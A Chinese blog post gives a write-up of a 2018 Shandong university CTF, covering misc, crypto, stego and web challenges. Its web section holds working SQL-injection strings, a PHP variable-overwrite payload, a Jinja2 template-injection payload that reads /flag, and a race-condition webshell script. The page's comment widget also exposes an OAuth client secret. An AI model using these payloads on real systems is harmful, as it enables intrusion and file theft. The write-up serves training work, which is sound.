<!--
	作者：Sariay
	时间：2018-09-25
	描述：There may be a bug, but don't worry, QiLing(器灵) says that it can work normally!
-->


	<!DOCTYPE html>
	<html>
		

<head><meta name="generator" content="Hexo 3.8.0">
	<title>第七届山东省大学生网络安全技能大赛Writeup</title>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="apple-mobile-web-app-title" content="Amaze UI">
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
    <meta name="author" content="miraitowa">
    <meta name="keywords" content="">
    <meta name="description" content="">
   	<!-- css -->
	<link rel="stylesheet" href="/css/style.css">

	<!-- favicon -->
	<link href="/img/favicon.ico" rel="Shortcut Icon" type="image/ico">
	
	<!-- font-awesome -->
	<link href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
</head>

	<body>	
		<!--Preloader-->
<div id="preloader">
	<div id="status">
		<img alt="PRELOADER" src="/img/logo.png">
	</div>
</div>
<!--Preloader end-->

<!-- header -->

	<header id="header-bg-2">

	
		<div id="cd-logo"><a href="/"><img src="/img/logo.png" alt="Logo"></a></div>
	
	
	<!-- motto or description -->
		
 		<p class="motto"></p>
	
	
	<!-- current page name or title -->
	
		
		
			
			<p class="page-name">当前文章&nbsp;:&nbsp;《第七届山东省大学生网络安全技能大赛Writeup》</p>
			
		
	
	
	<!-- others: such as change-bg, time... -->
	<p class="page-name-other">
		11/22/2018 
		<style type="text/css">
	header:after {
		content: '';
		position: relative;
		top: 0;
		left: 0;
		height: 100%;
		width: 100%;
		background: #222222;
		opacity: .5;
		z-index: -1;
	}
	
	.change-header-bg{
		font-style: normal;
	}
	.change-header-bg i{
		text-align: center;
		cursor: pointer;
		pointer-events: bounding-box;
	}
	@media(max-width:512px) {
		.change-header-bg {
			display: none;
			visibility: hidden;
		}
	}
	
</style>

<script type="text/javascript">
	function changeHeaderBg(){
		var random_bg = Math.floor(Math.random() * 109 + 1);
		var bg = 'url(https://miraitowa.github.io/Random-img/' + random_bg + '.jpg)';
		$("#header-bg-2").css("background-image", bg);
	}
</script>

<span class="change-header-bg">
	——&nbsp;<i class="fa fa-camera-retro" onclick="changeHeaderBg()"></i>	
</span>
	</p>		
</header>

<!-- nav -->
<div id="cd-nav">
	<a href="#0" title="menu" class="cd-nav-trigger"><span></span></a>

	<nav id="cd-main-nav">
		<ul>
			
      		<li class="fa fa-/">
           		<a href="/" title="主页">主页</a>	
      		</li>
    		
      		<li class="fa fa-/archives">
           		<a href="/archives" title="归档">归档</a>	
      		</li>
    		
      		<li class="fa fa-/categories">
           		<a href="/categories" title="分类">分类</a>	
      		</li>
    		
      		<li class="fa fa-/gallery">
           		<a href="/gallery" title="相册">相册</a>	
      		</li>
    		
      		<li class="fa fa-/about">
           		<a href="/about" title="关于">关于</a>	
      		</li>
    		
      		<li class="fa fa-/tags">
           		<a href="/tags" title="友链">友链</a>	
      		</li>
    		
    		
        	
		</ul>
	</nav>
</div>

		<!--main-->
		<main> 
		<div class="page-container">
		<!-- content srart -->
<div class="am-g am-g-fixed blog-fixed blog-content">
	<div class="am-u-md-8 am-u-sm-12">

		<article class="am-article blog-article-p">

			<div class="am-article-hd">
				


				<h1 class="am-article-title blog-text-center">
					
					
	
		<a href="/2018/11/16/第七届山东省大学生网络安全技能大赛Writeup/" itemprop="url">		
			第七届山东省大学生网络安全技能大赛Writeup		
		</a>
	

				</h1>

				<p class="am-article-meta blog-text-center">
					<span>
						<i class="fa fa-clock-o"></i> 
						<a href="/2018/11/16/第七届山东省大学生网络安全技能大赛Writeup/" itemprop="url">
	<time datetime="2018-11-16T15:06:06.564Z" itemprop="datePublished">
  		2018-11-16
  </time>
</a>    
&nbsp;
					</span>
					
					<span>						
						
					</span>
				</p>
			</div>

			<div class="am-article-bd">
				<div class="content" id="post-content">
					
						<h2 id="第七届山东省大学生网络安全技能大赛Writeup"><a href="#第七届山东省大学生网络安全技能大赛Writeup" class="headerlink" title="第七届山东省大学生网络安全技能大赛Writeup"></a>第七届山东省大学生网络安全技能大赛Writeup</h2><p>闲着没事把第七届山东省大学生网络安全技能大赛题目复现一下，也算巩固一下个人对于一些题目的理解</p>
<p>本文首发于先知社区：<a href="https://xz.aliyun.com/t/3295" target="_blank" rel="noopener">https://xz.aliyun.com/t/3295</a></p>
<p><img src="https://i.imgur.com/Qel0Cia.jpg" alt=""></p>
<h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="1-Crack-it"><a href="#1-Crack-it" class="headerlink" title="1.Crack it"></a>1.Crack it</h4><p><strong>题目描述</strong></p>
<p>破解该文件，获得密码，flag格式为：flag{<strong>***</strong>}</p>
<p><strong>知识点</strong></p>
<p>shadow文件破解</p>
<p><strong>解题思路</strong></p>
<p>kali下，无需加载字典，john直接破解即可。</p>
<p><img src="https://i.imgur.com/ctBBg5o.png" alt=""></p>
<pre><code>flag{hellokitty}
</code></pre><h4 id="2-进制转换"><a href="#2-进制转换" class="headerlink" title="2.进制转换"></a>2.进制转换</h4><p><strong>题目描述</strong></p>
<p>二进制、八进制、十进制、十六进制，你能分的清吗？</p>
<p><strong>知识点</strong></p>
<p>编程基础、进制转换</p>
<p><strong>解题思路</strong></p>
<pre><code>import binascii

text = &quot;d87 x65 x6c x63 o157 d109 o145 b100000 d116 b1101111 o40 x6b b1100101 b1101100 o141 d105 x62 d101 b1101001 d46 o40 d71 x69 d118 x65 x20 b1111001 o157 b1110101 d32 o141 d32 d102 o154 x61 x67 b100000 o141 d115 b100000 b1100001 d32 x67 o151 x66 d116 b101110 b100000 d32 d102 d108 d97 o147 d123 x31 b1100101 b110100 d98 d102 b111000 d49 b1100001 d54 b110011 x39 o64 o144 o145 d53 x61 b1100010 b1100011 o60 d48 o65 b1100001 x63 b110110 d101 o63 b111001 d97 d51 o70 d55 b1100010 d125 x20 b101110 x20 b1001000 d97 d118 o145 x20 d97 o40 d103 d111 d111 x64 d32 o164 b1101001 x6d o145 x7e&quot;
solution = &#39;&#39;
text2 = text.split(&#39; &#39;)
for x in text2:
print x
if x[0] == &#39;b&#39;: #binary
solution += chr(int(x[1:],2))
elif x[0] == &#39;x&#39;: # hexadecimal
solution += x[1:].decode(&quot;hex&quot;)
elif x[0] == &#39;d&#39;: # decimal
solution += chr(int(x[1:]))
elif x[0] == &#39;o&#39;: # octal
solution += chr(int(x[1:],8))
print solution
</code></pre><p><img src="https://i.imgur.com/SBqLnfX.png" alt=""></p>
<h4 id="3-basic"><a href="#3-basic" class="headerlink" title="3.basic"></a>3.basic</h4><p><strong>题目描述</strong></p>
<p>黑，白，黑白，黑黑白白。</p>
<p><strong>知识点</strong></p>
<p>python像素点写图片</p>
<p><strong>解题思路</strong></p>
<pre><code>from PIL import Image
import re # 506*122=61366
x = 150 #x坐标  通过对txt里的行数进行整数分解
y = 900 #坐标  x*y = 行数
im = Image.new(&quot;RGB&quot;,(x,y))#创建图片
file = open(&#39;basic.txt&#39;) #打开rbg值文件
#通过一个个rgb点生成图片
for i in range(0,x):
for j in range(0,y):
line = file.readline()#获取一行
rgb = line.split(&quot;,&quot;)#分离rgb
im.putpixel((i,j),(int(rgb[0]),int(rgb[1]),int(rgb[2])))#rgb转化为像素
im.show()
</code></pre><p>得到flag图片</p>
<p><img src="https://i.imgur.com/qcSdAuD.png" alt=""></p>
<pre><code>flag{RGB_1s_e4sY}
</code></pre><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="1-affine"><a href="#1-affine" class="headerlink" title="1.affine"></a>1.affine</h4><p><strong>题目描述</strong></p>
<p>y = 17*x-8 flag{szzyfimhyzd}<br>答案格式：flag{<strong><em>**</em></strong>}</p>
<p><strong>知识点</strong></p>
<p>仿射加密</p>
<p><strong>解题思路</strong></p>
<p>仿射加密，直接解密即可。</p>
<p><img src="https://i.imgur.com/tjcDv1n.png" alt=""></p>
<h4 id="2-rsa"><a href="#2-rsa" class="headerlink" title="2.rsa"></a>2.rsa</h4><p><strong>题目描述</strong></p>
<p>请破解密文</p>
<p><strong>知识点</strong></p>
<p>rsa wiener attack</p>
<p><strong>解题思路</strong></p>
<p>ne已经给出，可以看出e特别大，在e特别大的情况下，可以使用wiener attack的方法进行破解，</p>
<p>正好工具RsaCtfTool集成了wiener attack的方法，所以可以直接使用RsaCtfTool计算私钥， 如下所示： </p>
<p><img src="https://i.imgur.com/eWLz5I8.jpg" alt=""></p>
<p><img src="https://i.imgur.com/BB2kCnr.jpg" alt=""></p>
<p>使用pqe直接解密密文，得到flag,代码如下所示:</p>
<pre><code>#coding:utf-8
from libnum 
import n2s,s2nimport base64
def gcd(a, b):   #求最大公约数
if a &lt; b:
a, b = b, a
while b != 0:
temp = a % b
a = b
b = temp
return a
def egcd(a, b):
if a == 0:
return (b, 0, 1)
else:
g, y, x = egcd(b % a, a)
return (g, x - (b // a) * y, y)
def modinv(a, m):
g, x, y = egcd(a, m)
if g != 1:
   raise Exception(&#39;modular inverse does not exist&#39;)
else:
   return x % mif __name__ == &quot;__main__&quot;:
p=15991846970993213322072626901560749932686325766403404864023341810735319249066370916090640926219079368845510444031400322229147771682961132420481897362843199
q=28805791771260259486856902729020438686670354441296247148207862836064657849735343618207098163901787287368569768472521344635567334299356760080507454640207003
e = 354611102441307572056572181827925899198345350228753730931089393275463916544456626894245415096107834465778409532373187125318554614722599301791528916212839368121066035541008808261534500586023652767712271625785204280964688004680328300124849680477105302519377370092578107827116821391826210972320377614967547827619
# tmp = base64.b64decode(&quot;qzogS7X8M3ZOpkUhJJcbukaRduLyqHAPblmabaYSm9iatuulrHcEpBmil7V40N7gbsQXwYx5EBH5r5V2HRcEIOXjgfk5vpGLjPVxBLyXh2DajHPX6KvbFpQ8jNpCQbUNq8Hst00yDSO/6ri9dk6bk7+uyuN0b2K1bNG5St6sCQ4qYEA3xJbsHFvMqtvUdhMiqO7tNCUVTKZdN7iFvSJqK2IHosIf7FqO24zkHZpHi31sYU7pcgYEaGkVaKs8pjq6nbnffr4URfoexZHeQtq5UAkr95zD6WgvGcxaTDKafFntboX9GR9VUZnHePiio7nJ3msfue5rkIbISjmGCAlj+w==&quot;)
#  = 
d = modinv(e, (p - 1) * (q - 1))# c=s2n(tmp)
c = 38230991316229399651823567590692301060044620412191737764632384680546256228451518238842965221394711848337832459443844446889468362154188214840736744657885858943810177675871991111466653158257191139605699916347308294995664530280816850482740530602254559123759121106338359220242637775919026933563326069449424391192
#c = 225031483444634056931067907865853799650197225351377050632290334721073031287701730297815850654473721939907812470206115171738967740183098960272963323728747481560137205796840356532306950935686580268408289864109695494835661414073083573249882362332920722000099781994315336570711188934565379141406727420346806389405536474102730682155998263607095718543239272202402139286809779368710600842078606046563228470023546348908618719147790859257980882643030144242048154566691808688844513142261099020381730517293884263384819159874220288293023868919557980548807831273449743064237407705987056818011286315950476959812697067649075359373253
n = p*q
m=pow(c,d,n)
print n2s(m)
</code></pre><p>此处对于libnum库安装简单说明一下</p>
<pre><code>git clone https://github.com/hellman/libnum
cd libnum
python setup.py install
</code></pre><p>把脚本跑一下就会得到flag</p>
<h4 id="3-神秘的代码"><a href="#3-神秘的代码" class="headerlink" title="3.神秘的代码"></a>3.神秘的代码</h4><p><strong>题目描述</strong></p>
<p>xor</p>
<p><strong>知识点</strong></p>
<p>xor+aes_ecb</p>
<p><strong>解题思路</strong></p>
<p>将明文与密文进行异或，得到一段hint，如下所示：</p>
<pre><code>i am a hydre agenT, coverly spying on the superHeroes. I am aware of the group that iS going to aTtack you...but Hydra has had its diffErences with you in the past, so i&#39;m not going to maKe it vEry simple for You ....ecb...aes(I Vouch for this: 12345)...md5(this)...base64...
</code></pre><p>这里将大写字母提取出来，是THISTHEKEYIV，后面又提示是aes_ecb，所以这里有一个坑点，这个大写字母的组合并不是aes算法的key，</p>
<p>所以也不能用来解密，然后后面又提示是md5(this)，即将整段话进行md5，然后进行解密，最后的代码如下：</p>
<pre><code>import base64
import hashlib
from Crypto.Cipher import AES

def readfile(path):
with open(path, &#39;r&#39;) as f:
return f.read()
def xor(s1, s2):
return &#39;&#39;.join(chr(ord(a) ^ ord(b)) for a,b in zip(s1,s2))
# read the files
clear = readfile(&#39;info_clear.txt&#39;)
crypt = readfile(&#39;info_crypt.txt&#39;)
superhero = readfile(&#39;true_crypto.txt&#39;)
superhero = base64.b64decode(superhero)

# get the key
dec = xor(clear,crypt).rstrip(&#39;\n&#39;).encode(&#39;utf-8&#39;)
print(dec)
key = hashlib.md5(dec).hexdigest().encode()
print(key)

# decrypt aes-ecbcipher = AES.new(key, AES.MODE_ECB)
msg = cipher.decrypt(superhero)
print(msg)
</code></pre><p>简单说明一下关于：使用python的Crypto模块的AES加密文件</p>
<p>在cmd中执行：</p>
<pre><code>pip install pycrypto -i https://mirrors.aliyun.com/pypi/simple/
</code></pre><p>经过上边儿的步骤，就可以使下面的内容执行</p>
<pre><code>from Crypto.Cipher import AES
</code></pre><h3 id="Stego"><a href="#Stego" class="headerlink" title="Stego"></a>Stego</h3><h4 id="1-啊哒"><a href="#1-啊哒" class="headerlink" title="1.啊哒"></a>1.啊哒</h4><p><strong>题目描述</strong></p>
<p>有趣的表情包</p>
<p><strong>知识点</strong></p>
<p>exif、隐藏压缩包</p>
<p><strong>解题思路</strong></p>
<p>拿到之后是一个jpg文件，先使用binwalk分析下文件，得到图片中隐藏了一段tiff信息以及一个压缩包，都分离出来，发现压缩包被加密了，</p>
<p>tiff信息在相机型号出处有一段十六进制，转换成字符串以后是sdnisc_2018,如下图所示： </p>
<p><img src="https://i.imgur.com/0hnG3Wu.jpg" alt=""></p>
<p>使用这个密码解密压缩包，即可获得：<code>flag{3XiF_iNf0rM@ti0n}</code></p>
<h4 id="2-color"><a href="#2-color" class="headerlink" title="2.color"></a>2.color</h4><p><strong>题目描述</strong></p>
<p>你见过彩虹吗？</p>
<p><strong>知识点</strong></p>
<p>拉长图片，二进制转字符串。</p>
<p><strong>解题思路</strong></p>
<p>查看每张图片的最低位，发现有变化。组成之后是一句话：</p>
<pre><code>Make Me Tall
</code></pre><p>根据提示意思应该是要调整png的尺寸，扩大高度。</p>
<p><img src="https://i.imgur.com/bi0ES3k.png" alt=""></p>
<p>发现原来图像下部，有黑白块儿，按照黑-&gt;1，白-&gt;0转化成二进制数。</p>
<pre><code>1111111101011110111111111011111110111111 
00001100101010110001 01001010010000001101 11010011011101010111 
1001101101101011011000111001101101111101
</code></pre><p>经过多次尝试之后发现，每一列，七个数字组成一个字符，进行二进制转化之后即可得到flag。</p>
<pre><code>c1 = &#39;11111111010111101111&#39;
c2 = &#39;11111011111110111111&#39;
c3 = &#39;00001100101010110001&#39;
c4 = &#39;01001010010000001101&#39;
c5 = &#39;11010011011101010111&#39;
c6 = &#39;10011011011010110110&#39;
c7 = &#39;00111001101101111101&#39;

flag = &#39;&#39;

for i in range(0,20):
c = c1[i]+c2[i]+c3[i]+c4[i]+c5[i]+c6[i]+c7[i]
flag += chr(int(c,2))

print flag
</code></pre><p><img src="https://i.imgur.com/ElFoq8z.png" alt=""></p>
<h4 id="3-神秘的文件"><a href="#3-神秘的文件" class="headerlink" title="3.神秘的文件"></a>3.神秘的文件</h4><p><strong>知识点</strong></p>
<p>明文破解 + doc隐写</p>
<p><strong>解题思路</strong></p>
<p>将题目解压出来，题目压缩包里有个logo.png和一个加密压缩包，很明显的明文破解，</p>
<p>使用题目压缩包作为key和writeup压缩包进行明文破解(或者使用2345好压的标准压缩算法压缩logo.png)，得到密码： </p>
<p><img src="https://i.imgur.com/9xf7ERu.png" alt=""></p>
<p>解压后得到doc文件，当成压缩包解密，能找到flag.txt中有一串base64编码的字符串，解码即可。</p>
<pre><code>flag{d0cX_1s_ziP_file}
</code></pre><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="web1-babyweb"><a href="#web1-babyweb" class="headerlink" title="web1 - babyweb"></a>web1 - babyweb</h4><p>加XFF头和更改cookie的admin</p>
<p><img src="https://i.imgur.com/mSftQdp.png" alt=""></p>
<h4 id="web2-babyweb2"><a href="#web2-babyweb2" class="headerlink" title="web2 - babyweb2"></a>web2 - babyweb2</h4><pre><code>&lt;?php

include &#39;here.php&#39;;
$key = &#39;kelaibei&#39;;

if(isset($_GET[&#39;id&#39;])){
$id = $_GET[&#39;id&#39;];
@parse_str($id);
if ($key[99] != &#39;aabg7XSs&#39; &amp;&amp; md5($key[99]) == md5(&#39;aabg7XSs&#39;)) {
   echo $hint;
}
else{
echo &#39;try again&#39;;
}
}
else{
show_source(__FILE__);
}
</code></pre><p>利用parse_str变量覆盖，<code>paylaod:?id=key[99]=QNKCDZO</code></p>
<p>得到<code>upl04d50m3thing.php</code></p>
<p><img src="https://i.imgur.com/PAjSO1g.png" alt=""></p>
<p>写入一句话,提交得到php文件链接，访问发现内容被更改，输出Too slow!</p>
<p>利用条件竞争，先用burp的intruder开多线程访问</p>
<p><img src="https://i.imgur.com/CbO2dEm.png" alt=""></p>
<p>再利用脚本或其他方式尝试getshell</p>
<pre><code>import requests
url = &#39;http://47.105.148.65:29002/uploads/457b055ce2a489dd334216ed0564f9351506d690/coold.php&#39;
while 1:
r = requests.get(url)
if &#39;flag&#39; in  r.text:
print r.text

flag{fa8d57d013fda75ad1e58e59b94b45c3}
</code></pre><h4 id="easy-flask"><a href="#easy-flask" class="headerlink" title="easy_flask"></a>easy_flask</h4><p>Search Comments:处存在sql注入’ order by 4# 出现错误</p>
<p><img src="https://i.imgur.com/cZqhR1N.png" alt=""></p>
<p>然后查询</p>
<p><img src="https://i.imgur.com/LMLaANC.png" alt=""></p>
<p>存在ssti</p>
<p>SSTI，又称服务端模板注入攻击。其发生在MVC框架中的view层。</p>
<p>服务端接收了用户的输入，将其作为 Web 应用模板内容的一部分，在进行目标编译渲染的过程中，执行了用户插入的恶意内容，</p>
<p>因而可能导致了敏感信息泄露、代码执行、GetShell 等问题</p>
<p>但是add中限制字符长度，最多提交十个字符，没法正常使用ssti</p>
<p>测试search功能，username中存在sql注入</p>
<pre><code>sdpcc &#39; union select 1,1,1 -- -
</code></pre><p><img src="https://i.imgur.com/Ol6uhqy.png" alt=""></p>
<p>尝试查看flag</p>
<pre><code>{{ ().__class__.__bases__[0].__subclasses__()[40]("/flag").read()}}
</code></pre><p>就会得到flag:<code>flag{c15f43da-481e-4131-84b2-e315719b989b}</code></p>

					
				</div>
			</div>
		</article>

		<ul class="am-pagination">
    
    	<li class="am-pagination-prev">
   		<a class="pull-left" href="/2018/11/18/记南京两日感/" title="记南京两日感">
      		&laquo; 上一篇
		</a>
		</li>
	
	
		<li class="am-pagination-next">
		<a class="pull-right" href="/2018/11/16/PHP伪协议/" title="PHP伪协议">
			下一篇 &raquo;
		</a>
		</li>
	 
 </ul>
        

		<div class="theme-annie-comment-button-container">
	<button id="annie-comment-button" class="theme-annie-comment-button" onclick="Annie_Comment()">
		加载评论
		<!--加载评论-->
	</button>
</div>

<div id="annie-comment-container" class="theme-annie-comment-main-container">

	
		
			<!-- comment gitalk -->
			<!-- show gitalk comment -->

  <div id="gitalk-container"></div>


<!-- gitalk`s css & js -->
<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
<link rel="stylesheet" href="/css/comment.css">
<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>

<script type="text/javascript">
	//thanks O-R
	//https://github.com/gitalk/gitalk/issues/102#issuecomment-382970552
	//去除尾部匹配正则数组的字符串  
	//remove redundant characters
	String.prototype.trimEnd = function(regStr) {
		var result = this;
		if(regStr == undefined || regStr == null || regStr == "") {
			return result;
		}
		var array = regStr.split(',');

		if(array.length > 0) {

			var c = array.shift();
			var str = this;
			var i = str.length;
			var rg = new RegExp(c);
			var matchArr = str.match(rg);

			if(matchArr != undefined && matchArr != null && matchArr.length > 0) {
				var matchStr = matchArr[0].replace(/\\/g, "\\\\").replace(/\*/g, "\\*")
					.replace(/\+/g, "\\+").replace(/\|/g, "\\|")
					.replace(/\{/g, "\\{").replace(/\}/g, "\\}")
					.replace(/\(/g, "\\(").replace(/\)/g, "\\)")
					.replace(/\^/g, "\\^").replace(/\$/g, "\\$")
					.replace(/\[/g, "\\[").replace(/\]/g, "\\]")
					.replace(/\?/g, "\\?").replace(/\,/g, "\\,")
					.replace(/\./g, "\\.").replace(/\&/g, "\\&");
				matchStr = matchStr + '$';
				result = str.replace(new RegExp(matchStr), "");
			}

			if(array.length > 0) {
				return result.trimEnd(array.join())
			} else {
				return result;
			}
		}
	};

	//create gitalk
	var gitalk = new Gitalk({
		clientID: '74a83cc9b15a1cf53e10',
		clientSecret: 'b62af8b132c33178adcb0098e2315806e2e57cae',
		//id: window.location.pathname,
		// id: (window.location.pathname).split("/").pop().substring(0, 49),
		id: md5(location.href.trimEnd('#.*$,\\?.*$,index.html$')),
		repo: 'Annie-Gitalk',
		owner: 'miraitowa',
		admin: 'miraitowa',
		distractionFreeMode: 'true',
	})
	gitalk.render('gitalk-container');
</script>
		
	

</div>

<script type="text/javascript">
	/* Show Comment */
	var Annie_Comment = function() {
		function Show_Hidden(obj) {
			obj.style.display = 'block';
		}
		
		//var obutton = $('#annie-comment-button');
		//var obutton = $('#annie-comment-container');
		var obutton = document.getElementById("annie-comment-button" || "0");
		var odiv = document.getElementById("annie-comment-container");
		if( 'obutton' ) {
			obutton.onclick = function() {
				Show_Hidden(odiv);
				$("#annie-comment-button").css("display", 'none');
				return false;
			}
		}
	};

	(function Annie_Init() {
		Annie_Comment();
	})();
</script>
		
		<!--
	时间：2018-09-24
	描述：The TOC module refers to 'https://github.com/codefine/hexo-theme-mellow', include toc.ejs、toc.js、toc.css. All rights reserved by codefine. 
-->

	
		<aside class="post-widget">
			<nav class="post-toc-wrap" id="post-toc">
				
					<strong>文章目录</strong>
				
				
				<!--toc(post.content)-->
				<ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#第七届山东省大学生网络安全技能大赛Writeup"><span class="post-toc-text">第七届山东省大学生网络安全技能大赛Writeup</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Misc"><span class="post-toc-text">Misc</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#1-Crack-it"><span class="post-toc-text">1.Crack it</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#2-进制转换"><span class="post-toc-text">2.进制转换</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#3-basic"><span class="post-toc-text">3.basic</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Crypto"><span class="post-toc-text">Crypto</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#1-affine"><span class="post-toc-text">1.affine</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#2-rsa"><span class="post-toc-text">2.rsa</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#3-神秘的代码"><span class="post-toc-text">3.神秘的代码</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Stego"><span class="post-toc-text">Stego</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#1-啊哒"><span class="post-toc-text">1.啊哒</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#2-color"><span class="post-toc-text">2.color</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#3-神秘的文件"><span class="post-toc-text">3.神秘的文件</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Web"><span class="post-toc-text">Web</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#web1-babyweb"><span class="post-toc-text">web1 - babyweb</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#web2-babyweb2"><span class="post-toc-text">web2 - babyweb2</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#easy-flask"><span class="post-toc-text">easy_flask</span></a></li></ol></li></ol></li></ol>
			</nav>
			<div class="post-toc-bar"><div>
		</div></div></aside>
	

	</div>
</div>
		</div>
		</main>
		
		<!--footer-->
		<footer>
	<div class="blog-text-center">
		<div class="theme-annie-social">
				
				
					<a href="https://github.com/miraitowa" title="Github" target="_blank"><i class="fa fa-github"></i>&nbsp;</a>
					
				
				
					<a href="https://miraitowa.github.io/about/" title="Email" target="_blank"><i class="fa fa-envelope-o"></i>&nbsp;</a>
					
					
						
				
		</div>
	</div>

	<div class="blog-text-center">
		<div class="theme-annie-copyright">
			
				&copy; 2018, content by miraitowa. All Rights Reserved. 			   
			
		</div>
	</div>

	<div class="blog-text-center">
		<div class="theme-annie-copyright">
			<a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> Theme <a href="https://github.com/Sariay/hexo-theme-Annie" title="Annie" target="_blank" rel="noopener">Annie</a> by Sariay.		
		</div>
	</div>
</footer>
		<!-- <script src="http://code.jquery.com/jquery-2.1.1.min.js" type="text/javascript"></script> -->

<script>
	window.jQuery || document.write('<script src="/js/jquery-2.1.1.min.js"><\/script>')
</script>

<style>
	.motto {
		color: #000000;
		font-size: 20px;
		margin: 100px 25% 0;
		width: 50%;
		line-height: 1.4;
		font-family:"KaiTi", "STXingkai", "Source Sans Pro", "Segoe UI", "Lucida Grande", Helvetica, Arial, "Microsoft YaHei", FreeSans, Arimo, "Droid Sans", "wenquanyi micro hei", "Hiragino Sans GB", "Hiragino Sans GB W3", FontAwesome, sans-serif;
		text-align: center;
	}
	@media(max-width: 890px) {
		.motto {	
			margin: 100px 10% 0;
			width: 80%;
		}
	}
	@media(max-width: 890px) {
		.motto {
			margin: 100px 5% 0;
			width: 90%;
		}
	}
</style>


	<script src="/js/motto.js"></script>
	<script type="text/javascript">
		$(".motto").html(getMingYanContent());
	</script>	







	<script type="text/javascript" src="/js/toc.js"></script>


<script type="text/javascript" src="/js/main.js"></script>

<script type="text/javascript">
	//generate a random img that pre_name 'from 0 to 110'
	var random_bg = Math.floor(Math.random() * 109 + 1);

	//var bg = 'url(/img/random/' + random_bg + '.jpg)';		
	var bg = 'url(https://miraitowa.github.io/Random-img/' + random_bg + '.jpg)';

	$("#header-bg-2").css("background-image", bg);
</script>
		
		<!--back to top-->
        <style type="text/css">
	#totop {
		background: white;
		border-radius: 50%;
		position: fixed;
		right: 5.4%;
		bottom: 80px;
		cursor: pointer;
	}
	
	#totop a {
		color: #474747;
		background-color: transparent;
		padding: 10px;
		text-decoration: none;
	}
	
	@media(max-width:512px) {
		#totop {
			display: none;
			visibility: hidden;
		}
	}
</style>


	<div id="totop">
  		<a href="javascript:;" class="fa fa-arrow-up"></a>
	</div>

	</body>
	</html>

